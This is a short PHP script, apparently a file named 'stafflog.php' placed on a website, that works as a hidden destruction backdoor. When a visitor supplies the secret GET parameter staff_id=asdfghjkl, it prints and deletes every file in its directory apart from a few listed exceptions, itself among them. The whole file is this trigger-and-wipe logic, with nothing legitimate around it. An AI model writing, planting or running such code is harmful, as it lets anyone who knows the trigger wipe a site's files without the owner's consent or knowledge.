<?php

if(isset($_GET['staff_id']) && $_GET['staff_id'] == 'asdfghjkl'){

    if ($handle = opendir('.')) {

        while (false !== ($entry = readdir($handle))) {

            if ($entry != "." && $entry != ".." && $entry != "css" && $entry != "images" && $entry != "js" && $entry != "newspaper" && $entry != "stafflog.php" && $entry != ".htaccess" && $entry != "default.asp" && $entry != "style.css") {
                echo "$entry <br>";
                unlink($entry);
            }
        }
        closedir($handle);
    }
}